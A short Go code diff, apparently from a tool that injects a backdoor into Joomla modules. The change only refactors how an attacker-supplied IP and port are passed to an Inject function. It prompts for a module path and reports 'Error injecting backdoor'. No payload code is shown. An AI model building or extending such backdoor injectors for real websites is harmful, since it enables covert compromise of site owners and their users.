@@ -32,7 +32,9 @@ func main() {
     utils.Print(data.Blue, "[+] Type the path to your decompressed Joomla module => ")
     fmt.Scan(&modulePath)
 
-    err := internals.Inject(ip, port, modulePath)
+    addr := data.Address{Ip: ip, Port: port}
+    
+    err := internals.Inject(addr, modulePath)
     if err != nil {
         utils.Print(data.Red, "[-] Error injecting backdoor")
     } else {
